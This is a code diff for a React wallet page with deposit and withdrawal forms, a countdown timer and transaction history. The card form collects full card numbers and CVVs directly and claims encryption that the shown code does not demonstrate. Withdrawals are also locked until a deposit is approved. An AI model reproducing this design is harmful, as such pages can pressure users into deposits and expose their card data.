+                toast({ title: "Deposit required", description: "You must have at least one approved deposit before you can withdraw.", variant: "destructive" });
+                return;
+              }
+              openMode(null);
+              setPinInput(""); setPinConfirm(""); setPinError("");
+              setPinMode("verify");
+            }}
+            className={`flex items-center gap-3 p-4 rounded-2xl border-2 transition-all duration-200 text-left w-full ${
+              !hasApprovedDeposit
+                ? "border-gray-200 bg-gray-50 opacity-60 cursor-not-allowed"
+                : mode === "withdraw"
+                ? "border-amber-500 bg-amber-50 shadow-md"
+                : "border-gray-200 bg-white hover:border-amber-300 hover:bg-amber-50/50"
+            }`}>
+            <div className={`w-11 h-11 rounded-xl flex items-center justify-center shadow-md flex-shrink-0 ${hasApprovedDeposit ? "bg-gradient-to-br from-amber-400 to-amber-600" : "bg-gray-300"}`}>
+              <ArrowUpFromLine className="w-5 h-5 text-white" />
+            </div>
+            <div>
+              <p className="font-bold text-gray-900 text-sm sm:text-base">Withdraw Funds</p>
+              <p className="text-xs text-gray-500 mt-0.5">Transfer to your account</p>
+              {hasApprovedDeposit
+                ? <p className="text-xs text-amber-600 font-medium mt-1">1 – 24 hours processing</p>
+                : <p className="text-xs text-red-500 font-medium mt-1">Requires an approved deposit first</p>
+              }
+            </div>
+          </button>
+        </div>
+
+        {mode === "deposit" && !depositSuccess && !depositMethod && (
+          <div className="bg-white rounded-2xl shadow-sm border border-green-100 p-4 sm:p-6 mb-4 space-y-4">
+            <div className="flex items-center justify-between">
+              <h3 className="font-bold text-gray-900 text-sm sm:text-base">Select Payment Method</h3>
+              <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-red-50 border border-red-200">
+                <Clock className="w-3.5 h-3.5 text-red-600" />
+                <span className="text-red-600 font-bold text-sm tabular-nums" data-testid="countdown-timer">{countdown}</span>
+              </div>
+            </div>
+            <p className="text-gray-500 text-xs">Choose how you want to make your deposit</p>
+            <div className="grid grid-cols-3 gap-2 sm:gap-3">
+              {depositMethods.map(({ id, label, icon: Icon, img, desc, color }) => (
+                <button key={id} data-testid={`deposit-method-${id}`}
+                  onClick={() => setDepositMethod(id)}
+                  className="flex flex-col items-center gap-2 p-3 sm:p-4 rounded-xl border-2 border-gray-200 hover:border-green-400 hover:bg-green-50/40 transition-all duration-150">
+                  <div className={`w-11 h-11 rounded-xl overflow-hidden shadow-md ${img ? "" : `bg-gradient-to-br ${color} flex items-center justify-center`}`}>
+                    {img ? <img src={img} alt={label} className="w-full h-full object-cover" /> : <Icon className="w-5 h-5 text-white" />}
+                  </div>
+                  <div className="text-center">
+                    <p className="font-bold text-gray-900 text-xs">{label}</p>
+                    <p className="text-gray-400 text-[10px] leading-tight hidden sm:block">{desc}</p>
+                  </div>
+                </button>
+              ))}
+            </div>
+          </div>
+        )}
+
+        {mode === "deposit" && !depositSuccess && !!depositMethod && (
+          <div className="bg-white rounded-2xl shadow-sm border border-green-100 p-4 sm:p-6 mb-4 space-y-4">
+            <div className="flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <button onClick={() => setDepositMethod(null)} data-testid="button-back-deposit-method"
+                  className="p-1.5 rounded-lg hover:bg-gray-100 transition-colors">
+                  <ChevronLeft className="w-4 h-4 text-gray-500" />
+                </button>
+                <div>
+                  <h3 className="font-bold text-gray-900 text-sm sm:text-base">
+                    {depositMethods.find(m => m.id === depositMethod)?.label} Deposit
+                  </h3>
+                  <p className="text-gray-400 text-xs">Fill in your details below</p>
+                </div>
+              </div>
+              <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-red-50 border border-red-200">
+                <Clock className="w-3.5 h-3.5 text-red-600" />
+                <span className="text-red-600 font-bold text-sm tabular-nums" data-testid="countdown-timer-2">{countdown}</span>
+              </div>
+            </div>
+
+            {expired && (
+              <div className="flex items-center gap-2 bg-amber-50 border border-amber-200 rounded-xl px-3 py-2.5">
+                <AlertCircle className="w-4 h-4 text-amber-500 flex-shrink-0" />
+                <p className="text-amber-700 text-xs font-medium">Timer ended — your transaction ID is saved. You can still submit your deposit below.</p>
+              </div>
+            )}
+
+            <div>
+              <label className="text-xs font-medium text-gray-600 mb-1.5 flex items-center gap-1">
+                <Globe className="w-3 h-3" /> Your Country
+              </label>
+              <Select value={depositCountry} onValueChange={setDepositCountry}>
+                <SelectTrigger data-testid="select-deposit-country" className="h-11 border-gray-200 focus:border-green-400 rounded-xl text-sm">
+                  <SelectValue placeholder="Select your country" />
+                </SelectTrigger>
+                <SelectContent>
+                  {COUNTRIES.map((c) => (
+                    <SelectItem key={c} value={c}>{c}</SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            </div>
+
+            {depositMethod === "card" ? (
+              <div className="space-y-4">
+                <div
+                  className="relative rounded-2xl p-5 overflow-hidden shadow-2xl"
+                  style={{ background: "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)", minHeight: 160 }}
+                >
+                  <div className="absolute inset-0 opacity-10 pointer-events-none"
+                    style={{ backgroundImage: "repeating-linear-gradient(45deg, transparent, transparent 10px, rgba(255,255,255,0.15) 10px, rgba(255,255,255,0.15) 11px)" }} />
+                  <div className="relative z-10 flex flex-col gap-4">
+                    <div className="flex justify-between items-start">
+                      <div className="w-10 h-7 rounded-md bg-gradient-to-br from-yellow-300 to-amber-400 opacity-90" />
+                      <div className="flex items-center gap-1.5">
+                        <img src={imageMap.card} alt="card" className="h-6 w-auto object-contain rounded opacity-90" />
                       </div>
-                      <div className="flex justify-between font-bold text-base">
-                        <span>You Will Receive:</span>
-                        <span className="text-growth">GHS {netWithdrawal.toFixed(2)}</span>
+                    </div>
+                    <p className="font-mono text-white text-base sm:text-lg tracking-widest font-bold">
+                      {depositCard.number || "•••• •••• •••• ••••"}
+                    </p>
+                    <div className="flex justify-between items-end">
+                      <div>
+                        <p className="text-white/50 text-[9px] uppercase tracking-widest mb-0.5">Card Holder</p>
+                        <p className="text-white font-bold text-sm uppercase tracking-wider truncate max-w-[160px]">
+                          {depositCard.holder || "YOUR NAME"}
+                        </p>
                       </div>
-                    </CardContent>
-                  </Card>
-                  <Button type="submit" className="w-full" disabled={withdrawalForm.formState.isSubmitting}>
-                    {withdrawalForm.formState.isSubmitting ? 'Processing...' : 'Submit Withdrawal Request'}
-                  </Button>
-                </form>
-              </Form>
-            </CardContent>
-          </Card>
-        </TabsContent>
-      </Tabs>
+                      <div className="text-right">
+                        <p className="text-white/50 text-[9px] uppercase tracking-widest mb-0.5">Expires</p>
+                        <p className="text-white font-bold text-sm">{depositCard.expiry || "MM/YY"}</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div className="bg-white rounded-xl border border-blue-100 p-4 space-y-3">
+                  <div className="flex items-center gap-2 mb-1">
+                    <CreditCard className="w-4 h-4 text-blue-500" />
+                    <p className="text-xs font-bold text-blue-800 uppercase tracking-wide">Enter Card Details</p>
+                  </div>
+
+                  <div>
+                    <label className="text-xs font-medium text-gray-600 mb-1.5 block">Card Number</label>
+                    <Input
+                      data-testid="input-deposit-card-number"
+                      value={depositCard.number}
+                      inputMode="numeric"
+                      maxLength={19}
+                      placeholder="0000 0000 0000 0000"
+                      onChange={(e) => {
+                        const digits = e.target.value.replace(/\D/g, "").slice(0, 16);
+                        const formatted = digits.replace(/(.{4})/g, "$1 ").trim();
+                        setDepositCard({ ...depositCard, number: formatted });
+                      }}
+                      className="h-11 border-gray-200 focus:border-blue-400 font-mono text-base tracking-widest"
+                    />
+                  </div>
+
+                  <div>
+                    <label className="text-xs font-medium text-gray-600 mb-1.5 block">Cardholder Name</label>
+                    <Input
+                      data-testid="input-deposit-card-holder"
+                      value={depositCard.holder}
+                      placeholder="Name as on card"
+                      onChange={(e) => setDepositCard({ ...depositCard, holder: e.target.value.toUpperCase() })}
+                      className="h-11 border-gray-200 focus:border-blue-400 text-sm font-semibold uppercase"
+                    />
+                  </div>
+
+                  <div className="grid grid-cols-2 gap-3">
+                    <div>
+                      <label className="text-xs font-medium text-gray-600 mb-1.5 block">Expiry Date</label>
+                      <Input
+                        data-testid="input-deposit-card-expiry"
+                        value={depositCard.expiry}
+                        inputMode="numeric"
+                        placeholder="MM / YY"
+                        maxLength={5}
+                        onChange={(e) => {
+                          const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
+                          const formatted = digits.length > 2 ? `${digits.slice(0,2)}/${digits.slice(2)}` : digits;
+                          setDepositCard({ ...depositCard, expiry: formatted });
+                        }}
+                        className="h-11 border-gray-200 focus:border-blue-400 font-mono text-sm text-center"
+                      />
+                    </div>
+                    <div>
+                      <label className="text-xs font-medium text-gray-600 mb-1.5 block flex items-center gap-1">
+                        CVV / CVC
+                        <button type="button" onClick={() => setDepositCard(c => ({ ...c, cvvVisible: !c.cvvVisible }))}
+                          className="text-gray-400 hover:text-gray-600 transition-colors">
+                          <Shield className="w-3 h-3" />
+                        </button>
+                      </label>
+                      <Input
+                        data-testid="input-deposit-card-cvv"
+                        value={depositCard.cvv}
+                        type={depositCard.cvvVisible ? "text" : "password"}
+                        inputMode="numeric"
+                        placeholder="•••"
+                        maxLength={4}
+                        onChange={(e) => setDepositCard({ ...depositCard, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) })}
+                        className="h-11 border-gray-200 focus:border-blue-400 font-mono text-sm text-center tracking-widest"
+                      />
+                    </div>
+                  </div>
+
+                  <div className="flex items-center gap-2 bg-blue-50 rounded-lg px-3 py-2 border border-blue-100 mt-1">
+                    <ShieldCheck className="w-4 h-4 text-blue-500 flex-shrink-0" />
+                    <p className="text-blue-700 text-[11px] font-medium">Your card details are encrypted and securely processed</p>
+                  </div>
+                </div>
+              </div>
+            ) : null}
+
+            <div className="space-y-3">
+              <div>
+                <label className="text-xs font-medium text-gray-600 mb-1.5 block">Amount Sent ($)</label>
+                <div className="relative">
+                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-semibold">$</span>
+                  <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)}
+                    data-testid="input-amount" placeholder="0.00" min="0" step="0.01"
+                    className="pl-7 h-11 border-gray-200 focus:border-green-400 text-lg font-semibold" />
+                </div>
+                <div className="flex gap-2 mt-2 flex-wrap">
+                  {["50", "100", "250", "500"].map((q) => (
+                    <button key={q} onClick={() => setAmount(q)} data-testid={`quick-amount-${q}`}
+                      className="px-3 py-1.5 text-xs font-medium rounded-lg bg-gray-100 text-gray-600 hover:bg-green-100 hover:text-green-700 transition-colors">
+                      ${q}
+                    </button>
+                  ))}
+                </div>
+              </div>
+              {depositMethod !== "card" && (
+                <div>
+                  <label className="text-xs font-medium text-gray-600 mb-1.5 block">
+                    {depositMethod === "usdt" ? "Transaction Hash / ID" : "Transaction ID"}
+                  </label>
+                  <div className="relative">
+                    <Hash className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
+                    <Input value={depositTxId} onChange={(e) => setDepositTxId(e.target.value)}
+                      data-testid="input-deposit-txid"
+                      placeholder={depositMethod === "usdt" ? "e.g. 0x1234abcd..." : "e.g. TXN123456"}
+                      className="pl-9 h-11 border-gray-200 focus:border-green-400 font-mono text-sm" />
+                  </div>
+                </div>
+              )}
+              <Button onClick={handleDepositSubmit} data-testid="button-confirm-deposit"
+                disabled={isSubmitting}
+                className="w-full h-11 font-semibold rounded-xl bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white shadow-md">
+                {isSubmitting ? "Submitting request..." : "Submit Deposit Request"}
+              </Button>
+            </div>
+          </div>
+        )}
+
+        {mode === "deposit" && depositSuccess && (
+          <div className="bg-white rounded-2xl shadow-sm border border-green-200 p-6 mb-4 text-center space-y-3">
+            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto">
+              <PartyPopper className="w-8 h-8 text-green-600" />
+            </div>
+            <h3 className="text-lg font-bold text-gray-900">Deposit Submitted!</h3>
+            <p className="text-gray-500 text-sm">Your deposit of <span className="font-semibold text-green-600">${amount}</span> has been submitted. Your balance will be credited after confirmation.</p>
+            <Button onClick={() => openMode(null)} className="bg-gradient-to-r from-amber-500 to-amber-600 text-white font-semibold rounded-xl h-10 px-6">Done</Button>
+          </div>
+        )}
+
+        {mode === "withdraw" && !withdrawSuccess && (
+          <div className="bg-white rounded-2xl shadow-sm border border-amber-100 p-4 sm:p-6 mb-4 space-y-5">
+              <div className="flex items-start gap-3 bg-blue-50 border border-blue-100 rounded-xl px-3 py-3">
+              <Hourglass className="w-4 h-4 text-blue-500 flex-shrink-0 mt-0.5" />
+              <div>
+                <p className="text-blue-800 text-xs font-semibold">Processing Time: 1 – 24 Hours</p>
+                <p className="text-blue-700 text-xs mt-0.5 leading-relaxed">
+                  Withdrawals are processed Monday to Saturday. If your withdrawal is still pending after 24 hours, please contact the manager.
+                </p>
+              </div>
+            </div>
+
+            <div>
+              <h3 className="font-bold text-gray-900 text-sm sm:text-base mb-3">Select Payment Method</h3>
+              <div className="grid grid-cols-3 gap-2 sm:gap-3">
+                {withdrawMethods.map(({ id, label, icon: Icon, img, desc, color }) => (
+                  <button key={id} data-testid={`method-${id}`} onClick={() => setWithdrawMethod(id)}
+                    className={`flex flex-col items-center gap-1.5 p-3 rounded-xl border-2 transition-all duration-150 ${withdrawMethod === id ? "border-amber-500 bg-amber-50 shadow-md" : "border-gray-200 hover:border-amber-200 hover:bg-amber-50/40"}`}>
+                    <div className={`w-9 h-9 rounded-xl overflow-hidden shadow-sm ${img ? "" : `bg-gradient-to-br ${color} flex items-center justify-center`}`}>
+                      {img ? <img src={img} alt={label} className="w-full h-full object-cover" /> : <Icon className="w-4 h-4 text-white" />}
+                    </div>
+                    <p className="font-bold text-gray-900 text-xs">{label}</p>
+                    <p className="text-gray-400 text-[10px] text-center leading-tight hidden sm:block">{desc}</p>
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            {withdrawMethod && (
+            <div className="space-y-3 pt-4 border-t border-gray-100">
+               <div>
+                <label className="text-xs font-medium text-gray-600 mb-1.5 block">Amount to Withdraw ($)</label>
+                <div className="relative">
+                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-semibold">$</span>
+                  <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)}
+                    data-testid="input-withdraw-amount" placeholder="0.00" min="0" step="0.01"
+                    className="pl-7 h-11 border-gray-200 focus:border-amber-400 text-lg font-semibold" />
+                </div>
+              </div>
+              <Button onClick={handleWithdrawalSubmit} data-testid="button-confirm-withdraw"
+                disabled={isSubmitting}
+                className="w-full h-11 font-semibold rounded-xl bg-gradient-to-r from-amber-500 to-amber-600 hover:from-amber-600 hover:to-amber-700 text-white shadow-md">
+                {isSubmitting ? "Submitting request..." : `Withdraw $${amount || '0.00'}`}
+              </Button>
+            </div>
+            )}
+          </div>
+        )}
+
+         {mode === "withdraw" && withdrawSuccess && (
+          <div className="bg-white rounded-2xl shadow-sm border border-green-200 p-6 mb-4 text-center space-y-3">
+            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto">
+              <PartyPopper className="w-8 h-8 text-green-600" />
+            </div>
+            <h3 className="text-lg font-bold text-gray-900">Withdrawal Submitted!</h3>
+            <p className="text-gray-500 text-sm">Your withdrawal request for <span className="font-semibold text-green-600">${amount}</span> has been submitted for processing.</p>
+            {lastTxId && <p className="text-xs text-gray-400">TXN ID: {lastTxId}</p>}
+            <Button onClick={() => openMode(null)} className="bg-gradient-to-r from-amber-500 to-amber-600 text-white font-semibold rounded-xl h-10 px-6">Done</Button>
+          </div>
+        )}
+
+
+        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-4 sm:p-5">
+          <div className="flex items-center justify-between mb-3">
+            <h3 className="font-bold text-gray-900 text-sm sm:text-base">Transaction History</h3>
+            <div className="flex gap-1 bg-gray-100 p-1 rounded-lg">
+              {(["all", "deposit", "withdraw"] as const).map(tab => (
+                <button key={tab} onClick={() => setHistoryTab(tab)}
+                  className={`px-2.5 py-1 text-xs font-semibold rounded-md transition-colors ${historyTab === tab ? "bg-white text-amber-600 shadow-sm" : "text-gray-500 hover:text-gray-700"}`}>
+                  {tab.charAt(0).toUpperCase() + tab.slice(1)}
+                </button>
+              ))}
+            </div>
+          </div>
+          <div className="space-y-2">
+            {[...depositRecords, ...withdrawRecords]
+              .sort((a, b) => b.createdAt.toMillis() - a.createdAt.toMillis())
+              .filter(tx => {
+                if (historyTab === 'all') return true;
+                return historyTab === 'deposit' ? 'txId' in tx : !('txId' in tx);
+              })
+              .map(tx => {
+              const isDeposit = 'txId' in tx;
+              const statusColor = tx.status === 'approved' ? 'bg-green-100 text-green-700' : tx.status === 'rejected' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700';
+              const Icon = isDeposit ? ArrowDownToLine : ArrowUpFromLine;
+              const iconColor = isDeposit ? 'text-green-500' : 'text-amber-500';
+              return (
+                <div key={tx.id} className="flex items-center gap-3 p-2.5 rounded-lg hover:bg-gray-50 transition-colors">
+                  <div className={`w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 ${statusColor.replace('text-', 'bg-').replace('700', '100')}`}>
+                    <Icon className={`w-4 h-4 ${statusColor.replace('bg-','text-').replace('100','600')}`} />
+                  </div>
+                  <div className="flex-1 min-w-0">
+                    <p className="text-sm font-semibold text-gray-800">{isDeposit ? 'Deposit' : 'Withdrawal'} Request</p>
+                    <p className="text-xs text-gray-400 truncate">{isDeposit ? tx.txId : (tx as WithdrawRecord).method} · {new Date(tx.createdAt.toMillis()).toLocaleDateString()}</p>
+                  </div>
+                  <div className="text-right">
+                    <p className={`text-sm font-bold ${isDeposit ? 'text-green-600' : 'text-gray-800'}`}>{isDeposit ? '+' : '-'}${tx.amount.toFixed(2)}</p>
+                    <Badge className={`text-xs mt-0.5 ${statusColor} border-0`}>{tx.status}</Badge>
+                  </div>
+                </div>
+              );
+            })}
+             {depositRecords.length === 0 && withdrawRecords.length === 0 && (
+                <div className="text-center py-8">
+                    <p className="text-gray-500 text-sm">No transactions yet.</p>
+                </div>
+             )}
+          </div>
+        </div>
+      </div>
     </div>
   );
 }
